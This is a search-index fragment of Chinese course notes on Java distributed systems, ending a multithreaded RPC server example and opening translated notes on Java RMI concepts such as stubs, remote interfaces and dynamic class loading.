HashMap<String, Object> map = (HashMap<String, Object>) ois.readObject(); // \u63a5\u6536\u5ba2\u6237\u53d1\u9001\u7684Call \u5bf9\u8c61 RemoteCall remotecallobj = (RemoteCall) map.get(\"clientObject\"); // \u8f93\u51fa System.out.println(remotecallobj); // \u8c03\u7528\u76f8\u5173\u5bf9\u8c61\u7684\u65b9\u6cd5 System.out.println(String.format(\"Thread:%d calling......\", threadId)); remotecallobj = invoke(remotecallobj); // \u5411\u5ba2\u6237\u53d1\u9001\u5305\u542b\u4e86\u6267\u884c\u7ed3\u679c\u7684remotecallobj \u5bf9\u8c61 oos.writeObject(remotecallobj); ois.close(); oos.close(); socket.close(); } } public RemoteCall invoke(RemoteCall call) { Object result = null; try { String className = call.getClassName(); String methodName = call.getMethodName(); Object[] params = call.getParams(); Class<?> classType = Class.forName(className); Class<?>[] paramTypes = call.getParamTypes(); Method method = classType.getMethod(methodName, paramTypes); // \u4ecehashmap\u7f13\u5b58\u4e2d\u53d6\u51fa\u76f8\u5173\u7684\u8fdc\u7a0b\u5bf9\u8c61Object Object remoteObject = remoteObjects.get(className); if (remoteObject == null) { throw new Exception(className + \" \u7684\u8fdc\u7a0b\u5bf9\u8c61\u4e0d\u5b58\u5728\"); } else { result = method.invoke(remoteObject, params); System.out.println(\"\u8fdc\u7a0b\u8c03\u7528\u7ed3\u675f:remotObject:\" + remoteObject.toString() + \",params:\" + params.toString()); } } catch (Exception e) { System.out.println(\"\u9519\u8bef\uff1a\" + e.getMessage()); } call.setResult(result); return call; } public static void main(String args[]) throws Exception { // \u7ebf\u7a0b\u6570\u91cf int threadNum = 6; // \u521d\u59cb\u5316 Server server = new Server(); // \u521b\u5efa\u591a\u7ebf\u7a0b ExecutorService executor = Executors.newFixedThreadPool(threadNum); //\u628a\u4e8b\u5148\u521b\u5efa\u7684RemoteServceImpl \u5bf9\u8c61\u52a0\u4eba\u5230\u670d\u52a1\u5668\u7684\u7f13\u5b58\u4e2d //\u5728\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\u6ce8\u518c\u670d\u52a1 server.register(CLASS_PATH + \"loginService\", new loginServiceImp()); // \u591a\u7ebf\u7a0b\u8fd0\u884c Future[] future = new Future[threadNum]; // \u521b\u5efa\u7aef\u53e3\u6570\u7ec4 ServerSocket[] serverSocket = new ServerSocket[threadNum]; // \u521b\u5efa8000\u7aef\u53e3 ServerSocket port8000 = new ServerSocket(8000); // \u521b\u5efa8001\u7aef\u53e3 ServerSocket port8001 = new ServerSocket(8001); // \u521b\u5efa8002\u7aef\u53e3 ServerSocket port8002 = new ServerSocket(8002); for (int i = 0; i < threadNum; i++) { // \u7b2c\u4e00\u3001\u4e8c\u4e2a\u7ebf\u7a0b\u7aef\u53e3\u4e3a8000\uff0c\u8d1f\u8d23\u8c03\u5ea6\u8d44\u6e90\uff0c\u8d1f\u8f7d\u5747\u8861 if (i <= 1) { serverSocket[i] = port8000; } else if (i <= 3) { // \u7b2c\u4e09\u3001\u56db\u4e2a\u7ebf\u7a0b\u7aef\u53e3\u4e3a8001\uff0c\u6a21\u62df\u7b2c\u4e00\u53f0\u4e3b\u673a serverSocket[i] = port8001; } else { // \u7b2c\u4e94\u3001\u516d\u4e2a\u7ebf\u7a0b\u7aef\u53e3\u4e3a8002\uff0c\u6a21\u62df\u7b2c\u4e8c\u53f0\u4e3b\u673a serverSocket[i] = port8002; } } // \u5faa\u73af\u521b\u5efa\u7ebf\u7a0b for (int i = 0; i < threadNum; i++) { int finalI = i; future[i] = executor.submit(() -> { try { // 8000\u7aef\u53e3\u8d1f\u8f7d\u5747\u8861 if (finalI <= 1) { server.transferService(serverSocket[finalI], finalI + 1); } else { //\u6253\u5f00\u7f51\u7edc\u7aef\u53e3\uff0c\u63a5\u53d7\u5916\u90e8\u8bf7\u6c42\uff0c\u6267\u884c\u670d\u52a1\u529f\u80fd\uff0c\u8fd4\u56de\u7ed3\u679c server.exportService(serverSocket[finalI], finalI + 1); } } catch (Exception e) { e.printStackTrace(); } return 1; }); } // \u5faa\u73af\u83b7\u53d6\u7ebf\u7a0b\u7ed3\u679c\uff0c\u963b\u585e\u540c\u6b65 for (int i = 0; i < threadNum; i++) { future[i].get(); } // \u5173\u95ed\u7aef\u53e3 for (int i = 0; i < threadNum; i++) { serverSocket[i].close(); } } }","title":"5.3. \u670d\u52a1\u7aef"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#6","text":"[1] https://www.tutorialspoint.com/remote-procedure-call-rpc \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/","text":"Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI) # \u76ee\u5f55 # Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI) \u76ee\u5f55 1. \u80cc\u666f 2. RMI \u6982\u8ff0 3. \u4ec0\u4e48\u662f RMI \u5e94\u7528 3.1. \u5b9a\u4e49 3.2. \u52a8\u6001\u4ee3\u7801\u52a0\u8f7d\u7684\u4f18\u70b9 3.3. \u8fdc\u7a0b\u63a5\u53e3\u3001\u5bf9\u8c61\u548c\u65b9\u6cd5 3.4. \u4f7f\u7528RMI\u521b\u5efa\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f 3.4.1. \u8bbe\u8ba1\u548c\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6 3.4.2. \u7f16\u8bd1\u6e90\u6587\u4ef6 3.4.3. \u4f7f\u7c7b\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee 3.4.4. \u542f\u52a8\u5e94\u7528\u7a0b\u5e8f 3.5. \u6784\u5efa\u4e00\u4e2a\u901a\u7528\u7684\u8ba1\u7b97\u5f15\u64ce 4. \u5982\u4f55\u5b9e\u73b0\u4e00\u4e2a RMI \u670d\u52a1\u5668 4.1. \u8bbe\u8ba1\u8fdc\u7a0b\u63a5\u53e3 4.2. \u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3 4.2.1. \u58f0\u660e\u6b63\u5728\u5b9e\u73b0\u7684\u8fdc\u7a0b\u63a5\u53e3 4.2.2. \u5b9a\u4e49\u8fdc\u7a0b\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5 4.2.3. \u63d0\u4f9b\u6bcf\u79cd\u8fdc\u7a0b\u65b9\u6cd5\u7684\u5b9e\u73b0 4.2.4. \u5728RMI\u4e2d\u4f20\u9012\u5bf9\u8c61 4.2.5. \u5b9e\u73b0\u670d\u52a1\u5668\u7aef\u7684main\u65b9\u6cd5 4.2.6. \u521b\u5efa\u548c\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668 4.2.7. \u4f7f\u8fdc\u7a0b\u5bf9\u8c61\u53ef\u4f9b\u5ba2\u6237\u7aef\u4f7f\u7528 5. \u5982\u4f55\u521b\u5efa\u4e00\u4e2a RMI \u5ba2\u6237\u7aef 6. \u7f16\u8bd1\u5e76\u8fd0\u884c 1. \u80cc\u666f # \u8fd9\u5b66\u671f\u4e0a\u4e86\u300a\u5206\u5e03\u5f0f\u7cfb\u7edf\u300b\u8bfe\u7a0b\uff0c\u5185\u5bb9\u4e3b\u8981\u662f\u57fa\u4e8eJava\u5b9e\u73b0\u5206\u5e03\u5f0f\u8ba1\u7b97\uff0c\u6240\u4ee5\u8001\u5e08\u524d\u51e0\u8282\u8bfe\u4e3b\u8981\u5728\u7ed9\u6211\u4eec\u8bb2\u7528Java\u505a\u5206\u5e03\u5f0f\u53ef\u80fd\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u6280\u672f\u3002\u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\uff0c\u6211\u5c06\u8001\u5e08\u8bb2\u7684\u5185\u5bb9\u7ed3\u5408\u4e66\u7c4d\u505a\u4e86\u4e00\u4e9b\u6574\u7406\uff0c\u8fd9\u4e00\u7bc7\u4e3b\u8981\u8ba8\u8bbaJava\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI)\u3002 \u4e0b\u9762\u7684\u5185\u5bb9\u4e3b\u8981\u7ffb\u8bd1\u81ea Java\u5b98\u65b9\u6587\u6863 \u3002\u6211\u4f7f\u7528\u7684\u662f Google \u7ffb\u8bd1\uff0c\u7ffb\u5b8c\u4e86\u4ee5\u540e\u5982\u679c\u6709\u4e0d\u592a\u5bf9\u7684\u5730\u65b9\u5c31\u624b\u52a8\u8c03\u6574\u4e86\u4e00\u4e0b\uff0c\u96be\u514d\u6709\u4e00\u4e9b\u5730\u65b9\u7ffb\u8bd1\u5f97\u4e0d\u662f\u5f88\u6e05\u695a\uff0c\u6b22\u8fce\u6307\u51fa\uff0c\u6216\u76f4\u63a5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u539f\u6587\u3002 2. RMI \u6982\u8ff0 # \u5b9a\u4e49 \uff1a Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI) \u7cfb\u7edf\u5141\u8bb8\u5728\u4e00\u4e2aJava\u865a\u62df\u673a\u4e2d\u8fd0\u884c\u7684\u5bf9\u8c61\u8c03\u7528\u5728\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u4e2d\u8fd0\u884c\u7684\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002RMI\u63d0\u4f9b\u4e86\u7528 Java \u7f16\u7a0b\u8bed\u8a00\u7f16\u5199\u7684\u7a0b\u5e8f\u4e4b\u95f4\u7684\u8fdc\u7a0b\u901a\u4fe1\u3002 \u6ce8 \uff1a\u5982\u679c\u8981\u8fde\u63a5\u5230\u73b0\u6709\u7684 IDL \u7a0b\u5e8f\uff0c\u5e94\u8be5\u4f7f\u7528 Java IDL \u800c\u4e0d\u662fRMI\u3002 \u672c\u6587\u7b80\u8981\u6982\u8ff0\u4e86 RMI \u7cfb\u7edf\uff0c\u7136\u540e\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u5ba2\u6237\u7aef/\u670d\u52a1\u5668\u793a\u4f8b\uff0c\u8be5\u793a\u4f8b\u4f7f\u7528 RMI \u7684\u72ec\u7279\u529f\u80fd\u5728\u8fd0\u884c\u65f6\u52a0\u8f7d\u548c\u6267\u884c\u7528\u6237\u5b9a\u4e49\u7684\u4efb\u52a1\u3002\u793a\u4f8b\u4e2d\u7684\u670d\u52a1\u5668\u5b9e\u73b0\u4e86\u4e00\u4e2a\u901a\u7528\u7684\u8ba1\u7b97\u5f15\u64ce\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528\u8be5\u5f15\u64ce\u8ba1\u7b97 \\pi \u7b26\u53f7\u7684\u503c\u3002 3. \u4ec0\u4e48\u662f RMI \u5e94\u7528 # 3.1. \u5b9a\u4e49 # \u5b9a\u4e49 \uff1a RMI\u5e94\u7528\u7a0b\u5e8f \u901a\u5e38\u5305\u542b\u4e24\u4e2a\u72ec\u7acb\u7684\u7a0b\u5e8f\uff0c\u4e00\u4e2a\u670d\u52a1\u7aef\u548c\u4e00\u4e2a\u5ba2\u6237\u7aef\u3002 \u5178\u578b\u7684 \u670d\u52a1\u7aef\u7a0b\u5e8f \u4f1a\u521b\u5efa\u4e00\u4e9b\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u4f7f\u8fd9\u4e9b\u5bf9\u8c61\u7684\u5f15\u7528\u53ef\u88ab\u8bbf\u95ee\uff0c\u5e76\u7b49\u5f85\u5ba2\u6237\u7aef\u8c03\u7528\u8fd9\u4e9b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\u3002 \u5178\u578b\u7684 \u5ba2\u6237\u7aef\u7a0b\u5e8f \u4f1a\u83b7\u5f97\u5bf9\u670d\u52a1\u5668\u4e0a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u7684\u8fdc\u7a0b\u5f15\u7528\uff0c\u7136\u540e\u8c03\u7528\u8fd9\u4e9b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\u3002RMI\u63d0\u4f9b\u4e86\u670d\u52a1\u5668\u548c\u5ba2\u6237\u673a\u4e4b\u95f4\u901a\u4fe1\u548c\u6765\u56de\u4f20\u9012\u4fe1\u606f\u7684\u673a\u5236\u3002\u8fd9\u6837\u7684\u5e94\u7528\u7a0b\u5e8f\u6709\u65f6\u88ab\u79f0\u4e3a\u5206\u5e03\u5f0f\u5bf9\u8c61\u5e94\u7528\u7a0b\u5e8f\u3002 \u5206\u5e03\u5f0f\u5bf9\u8c61\u5e94\u7528\u7a0b\u5e8f \u7684\u529f\u80fd: \u5b9a\u4f4d\u8fdc\u7a0b\u5bf9\u8c61 \u3002\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u673a\u5236\u6765\u83b7\u53d6\u5bf9\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u7528RMI\u7684\u7b80\u5355\u547d\u540d\u5de5\u5177\u2014\u2014RMI\u6ce8\u518c\u8868\u6765\u6ce8\u518c\u5b83\u7684\u8fdc\u7a0b\u5bf9\u8c61\u3002\u6216\u8005\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u8fdc\u7a0b\u8c03\u7528\u7684\u4e00\u90e8\u5206\u4f20\u9012\u548c\u8fd4\u56de\u8fdc\u7a0b\u5bf9\u8c61\u5f15\u7528\u3002 \u4e0e\u8fdc\u7a0b\u5bf9\u8c61\u901a\u4fe1 \u3002\u8fdc\u7a0b\u5bf9\u8c61\u4e4b\u95f4\u901a\u4fe1\u7684\u7ec6\u8282\u7531RMI\u5904\u7406\u3002\u5bf9\u4e8e\u7a0b\u5e8f\u5458\u6765\u8bf4\uff0c\u8fdc\u7a0b\u901a\u4fe1\u7c7b\u4f3c\u4e8e\u666e\u901a\u7684Java\u65b9\u6cd5\u8c03\u7528\u3002 \u52a0\u8f7d\u4f20\u9012\u7684\u5bf9\u8c61\u7684\u7c7b\u5b9a\u4e49 \u3002\u56e0\u4e3aRMI\u5141\u8bb8\u5bf9\u8c61\u6765\u56de\u4f20\u9012\uff0c\u6240\u4ee5\u5b83\u63d0\u4f9b\u4e86\u52a0\u8f7d\u5bf9\u8c61\u7684\u7c7b\u5b9a\u4e49\u4ee5\u53ca\u4f20\u8f93\u5bf9\u8c61\u6570\u636e\u7684\u673a\u5236\u3002 \u4e0b\u9762\u7684\u63d2\u56fe\u63cf\u8ff0\u4e86\u4e00\u4e2a RMI\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f \uff0c\u5b83\u4f7f\u7528 RMI\u6ce8\u518c\u8868 \u6765\u83b7\u53d6\u5bf9\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002 \u670d\u52a1\u5668\u8c03\u7528\u6ce8\u518c\u8868\u5c06\u540d\u79f0\u4e0e\u8fdc\u7a0b\u5bf9\u8c61\u5173\u8054\uff08\u6216\u7ed1\u5b9a\uff09\u3002 \u5ba2\u6237\u7aef\u901a\u8fc7\u670d\u52a1\u5668\u6ce8\u518c\u8868\u4e2d\u7684\u540d\u79f0\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u5176\u4e0a\u8c03\u7528\u4e00\u4e2a\u65b9\u6cd5\u3002 \u56fe\u4e2d\u8fd8\u663e\u793a\u4e86 RMI \u7cfb\u7edf\u4f7f\u7528\u4e00\u4e2a\u73b0\u6709\u7684 web \u670d\u52a1\u5668\u6765\u52a0\u8f7d\u7c7b\u5b9a\u4e49\uff0c\u4ece\u670d\u52a1\u5668\u5230\u5ba2\u6237\u7aef\uff0c\u4ece\u5ba2\u6237\u7aef\u5230\u670d\u52a1\u5668\uff0c\u5728\u9700\u8981\u7684\u65f6\u5019\u52a0\u8f7d\u5bf9\u8c61\u3002 \\text{Figure 1. RMI\u5e94\u7528\u7a0b\u5e8f} 3.2. \u52a8\u6001\u4ee3\u7801\u52a0\u8f7d\u7684\u4f18\u70b9 # RMI \u7684\u6838\u5fc3\u548c\u72ec\u7279\u7684\u7279\u6027\u4e4b\u4e00\u662f\uff0c\u5982\u679c\u5bf9\u8c61\u7684\u7c7b\u6ca1\u6709\u5728\u63a5\u6536\u65b9\u7684 Java \u865a\u62df\u673a\u4e2d\u5b9a\u4e49\uff0c\u5b83\u5c31\u80fd\u591f\u4e0b\u8f7d\u5bf9\u8c61\u7684\u7c7b\u7684\u5b9a\u4e49\u3002\u5bf9\u8c61\u7684\u6240\u6709\u7c7b\u578b\u548c\u884c\u4e3a\uff08\u4ee5\u524d\u53ea\u80fd\u5728\u5355\u4e2a Java \u865a\u62df\u673a\u4e2d\u4f7f\u7528\uff09\u90fd\u53ef\u4ee5\u4f20\u8f93\u5230\u53e6\u4e00\u4e2a\uff08\u53ef\u80fd\u662f\u8fdc\u7a0b\u7684\uff09 Java \u865a\u62df\u673a\u3002RMI\u901a\u8fc7\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u4f20\u9012\u5bf9\u8c61\uff0c\u56e0\u6b64\u5f53\u5bf9\u8c61\u88ab\u53d1\u9001\u5230\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u65f6\uff0c\u5bf9\u8c61\u7684\u884c\u4e3a\u4e0d\u4f1a\u6539\u53d8\u3002\u8be5\u529f\u80fd\u5141\u8bb8\u5c06\u65b0\u7684\u7c7b\u578b\u548c\u884c\u4e3a\u5f15\u5165\u8fdc\u7a0b Java \u865a\u62df\u673a\uff0c\u4ece\u800c\u52a8\u6001\u6269\u5c55\u5e94\u7528\u7a0b\u5e8f\u7684\u884c\u4e3a\u3002\u672c\u6587\u4e2d\u7684\u8ba1\u7b97\u5f15\u64ce\u793a\u4f8b\u4f7f\u7528\u6b64\u529f\u80fd\u4e3a\u5206\u5e03\u5f0f\u7a0b\u5e8f\u5f15\u5165\u65b0\u7684\u884c\u4e3a\u3002 3.3. \u8fdc\u7a0b\u63a5\u53e3\u3001\u5bf9\u8c61\u548c\u65b9\u6cd5 # \u4e0e\u4efb\u4f55\u5176\u4ed6 Java \u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\uff0c\u4f7f\u7528 Java RMI \u6784\u5efa\u7684\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u7531\u63a5\u53e3\u548c\u7c7b\u7ec4\u6210\u3002\u63a5\u53e3\u58f0\u660e\u65b9\u6cd5\u3002\u8fd9\u4e9b\u7c7b\u5b9e\u73b0\u63a5\u53e3\u4e2d\u58f0\u660e\u7684\u65b9\u6cd5\uff0c\u53ef\u80fd\u8fd8\u58f0\u660e\u5176\u4ed6\u65b9\u6cd5\u3002\u5728\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u4e00\u4e9b\u5b9e\u73b0\u53ef\u80fd\u9a7b\u7559\u5728\u4e00\u4e9b Java \u865a\u62df\u673a\u4e2d\uff0c\u800c\u4e0d\u662f\u5176\u4ed6\u865a\u62df\u673a\u3002\u5177\u6709\u53ef\u4ee5\u8de8 Java \u865a\u62df\u673a\u8c03\u7528\u7684\u65b9\u6cd5\u7684\u5bf9\u8c61\u79f0\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\u3002 \u5bf9\u8c61\u901a\u8fc7\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3\u800c\u6210\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u8fdc\u7a0b\u63a5\u53e3\u5177\u6709\u4ee5\u4e0b\u7279\u5f81: \u8fdc\u7a0b\u63a5\u53e3\u6269\u5c55\u4e86 java.rmi.Remote \u63a5\u53e3\u3002 \u63a5\u53e3\u7684\u6bcf\u4e2a\u65b9\u6cd5\u5728\u5b83\u7684 throws \u5b50\u53e5\u4e2d\u90fd\u58f0\u660e\u4e86 java.rmi.RemoteException \uff0c\u4ee5\u53ca\u4efb\u4f55\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u5f02\u5e38\u3002 \u5f53\u5bf9\u8c61\u4ece\u4e00\u4e2a Java \u865a\u62df\u673a\u4f20\u9012\u5230\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u65f6\uff0c RMI \u5c06\u8fdc\u7a0b\u5bf9\u8c61\u4e0e\u975e\u8fdc\u7a0b\u5bf9\u8c61\u533a\u522b\u5bf9\u5f85\u3002 RMI \u4e0d\u662f\u5728\u63a5\u6536\u65b9\u7684 Java \u865a\u62df\u673a\u4e2d\u590d\u5236\u5b9e\u73b0\u5bf9\u8c61\uff0c\u800c\u662f\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\u4f20\u9012 \u8fdc\u7a0b\u5b58\u6839\uff08Stub\uff09 \u3002\u5b58\u6839\u5145\u5f53\u8fdc\u7a0b\u5bf9\u8c61\u7684\u672c\u5730\u4ee3\u8868\u6216\u4ee3\u7406\uff0c\u5bf9\u4e8e\u5ba2\u6237\u7aef\u6765\u8bf4\uff0c\u5b83\u57fa\u672c\u4e0a\u662f\u8fdc\u7a0b\u5f15\u7528\u3002\u5ba2\u6237\u7aef\u8c03\u7528\u672c\u5730\u5b58\u6839\u4e0a\u7684\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u8d1f\u8d23\u5bf9\u8fdc\u7a0b\u5bf9\u8c61\u6267\u884c\u65b9\u6cd5\u8c03\u7528\u3002 \u8fdc\u7a0b\u5bf9\u8c61\u7684 \u5b58\u6839 \uff08Stub\uff09\u5b9e\u73b0\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7684\u540c\u4e00\u7ec4\u8fdc\u7a0b\u63a5\u53e3\u3002\u6b64\u5c5e\u6027\u5141\u8bb8\u5c06\u5b58\u6839\u8f6c\u6362\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7684\u4efb\u4f55\u63a5\u53e3\u3002\u4f46\u662f\uff0c\u53ea\u6709\u5728\u8fdc\u7a0b\u63a5\u53e3\u4e2d\u5b9a\u4e49\u7684\u90a3\u4e9b\u65b9\u6cd5\u53ef\u4ee5\u4ece\u63a5\u6536\u7684Java\u865a\u62df\u673a\u4e2d\u8c03\u7528\u3002 \u56fe2-3 \u80fd\u591f\u66f4\u52a0\u6e05\u6670\u5730\u63cf\u8ff0RMI\u7684\u4ea4\u4e92\u8fc7\u7a0b\u3002 \\text{Figure 2. RMI\u7684\u4ea4\u4e92\u56fe} \\text{Figure 3. \u5b58\u6839\u548c\u9aa8\u5e72\u7f51\u7684\u5177\u4f53\u901a\u4fe1\u8fc7\u7a0b} 3.4. \u4f7f\u7528RMI\u521b\u5efa\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f # \u4f7f\u7528RMI\u6765\u5f00\u53d1\u4e00\u4e2a\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u5305\u62ec\u4ee5\u4e0b\u4e00\u822c\u6b65\u9aa4: \u8bbe\u8ba1\u548c\u5b9e\u73b0\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u7684\u7ec4\u4ef6 \u7f16\u8bd1\u6e90\u6587\u4ef6 \u4f7f\u7c7b\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee \u542f\u52a8\u5e94\u7528\u7a0b\u5e8f 3.4.1. \u8bbe\u8ba1\u548c\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6 # \u9996\u5148\uff0c\u786e\u5b9a\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u4f53\u7cfb\u7ed3\u6784\uff0c\u5305\u62ec\u54ea\u4e9b\u7ec4\u4ef6\u662f\u672c\u5730\u5bf9\u8c61\uff0c\u54ea\u4e9b\u7ec4\u4ef6\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u3002\u8fd9\u4e2a\u6b65\u9aa4\u5305\u62ec: \u5b9a\u4e49\u8fdc\u7a0b\u63a5\u53e3 \u3002\u8fdc\u7a0b\u63a5\u53e3\u6307\u5b9a\u5ba2\u6237\u7aef\u53ef\u4ee5\u8fdc\u7a0b\u8c03\u7528\u7684\u65b9\u6cd5\u3002\u5ba2\u6237\u7aef\u9762\u5411\u8fdc\u7a0b\u63a5\u53e3\u7f16\u7a0b\uff0c\u800c\u4e0d\u662f\u9762\u5411\u90a3\u4e9b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b\u3002\u8fd9\u4e9b\u63a5\u53e3\u7684\u8bbe\u8ba1\u5305\u62ec\u5c06\u7528\u4f5c\u8fd9\u4e9b\u65b9\u6cd5\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u5bf9\u8c61\u7c7b\u578b\u7684\u786e\u5b9a\u3002\u5982\u679c\u8fd9\u4e9b\u63a5\u53e3\u6216\u7c7b\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u8fd8\u4e0d\u5b58\u5728\uff0c\u60a8\u4e5f\u9700\u8981\u5b9a\u4e49\u5b83\u4eec\u3002 \u5b9e\u73b0\u8fdc\u7a0b\u5bf9\u8c61 \u3002\u8fdc\u7a0b\u5bf9\u8c61\u5fc5\u987b\u5b9e\u73b0\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u3002\u8fdc\u7a0b\u5bf9\u8c61\u7c7b\u53ef\u4ee5\u5305\u62ec\u4ec5\u5728\u672c\u5730\u53ef\u7528\u7684\u5176\u4ed6\u63a5\u53e3\u548c\u65b9\u6cd5\u7684\u5b9e\u73b0\u3002\u5982\u679c\u8981\u5c06\u4efb\u4f55\u672c\u5730\u7684\u7c7b\u4f5c\u4e3a\u8fd9\u4e9b\u65b9\u6cd5\u7684\u53c2\u6570\u6216\u8fd4\u56de\u503c\u4f7f\u7528\uff0c\u90a3\u4e48\u8fd9\u4e9b\u672c\u5730\u7684\u7c7b\u4e5f\u5fc5\u987b\u5b9e\u73b0\u5b83\u4eec\u3002 \u5b9e\u73b0\u5ba2\u6237\u7aef \u3002\u4f7f\u7528\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5ba2\u6237\u7aef\u53ef\u4ee5\u5728\u5b9a\u4e49\u8fdc\u7a0b\u63a5\u53e3\u4e4b\u540e\u7684\u4efb\u4f55\u65f6\u5019\u5b9e\u73b0\uff0c\u5305\u62ec\u5728\u90e8\u7f72\u8fdc\u7a0b\u5bf9\u8c61\u4e4b\u540e\u3002 3.4.2. \u7f16\u8bd1\u6e90\u6587\u4ef6 # \u4e0e\u4efb\u4f55 Java \u7a0b\u5e8f\u4e00\u6837\uff0c\u4f7f\u7528 javac \u7f16\u8bd1\u5668\u7f16\u8bd1\u6e90\u6587\u4ef6\u3002\u6e90\u6587\u4ef6\u5305\u542b\u8fdc\u7a0b\u63a5\u53e3\u7684\u58f0\u660e\u3001\u5b83\u4eec\u7684\u5b9e\u73b0\u3001\u4efb\u4f55\u5176\u4ed6\u670d\u52a1\u7aef\u7c7b\u548c\u5ba2\u6237\u7aef\u7c7b\u3002 \u6ce8 :\u5bf9\u4e8eJava\u5e73\u53f0\u4e4b\u524d\u7684\u7248\u672c\uff0c\u5373\u6807\u51c6\u72485.0\uff0c\u901a\u8fc7\u4f7f\u7528 rmic \u7f16\u8bd1\u5668\u6784\u5efa\u5b58\u6839\u7c7b\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u6b65\u9aa4\u3002\u7136\u800c\uff0c\u8fd9\u4e00\u6b65\u5df2\u7ecf\u6ca1\u6709\u5fc5\u8981\u4e86\u3002 3.4.3. \u4f7f\u7c7b\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee # \u5728\u6b64\u6b65\u9aa4\u4e2d\uff0c\u4f60\u5c06\u4f7f\u67d0\u4e9b\u7c7b\u5b9a\u4e49\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\uff0c\u4f8b\u5982\u8fdc\u7a0b\u63a5\u53e3\u53ca\u5176\u5173\u8054\u7c7b\u578b\u7684\u5b9a\u4e49\uff0c\u4ee5\u53ca\u9700\u8981\u4e0b\u8f7d\u5230\u5ba2\u6237\u7aef\u6216\u670d\u52a1\u5668\u7684\u7c7b\u7684\u5b9a\u4e49\u3002\u7c7b\u5b9a\u4e49\u901a\u5e38\u901a\u8fc7 web \u670d\u52a1\u5668\u8fdb\u884c\u7f51\u7edc\u8bbf\u95ee\u3002 3.4.4. \u542f\u52a8\u5e94\u7528\u7a0b\u5e8f # \u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u5305\u62ec\u8fd0\u884c RMI 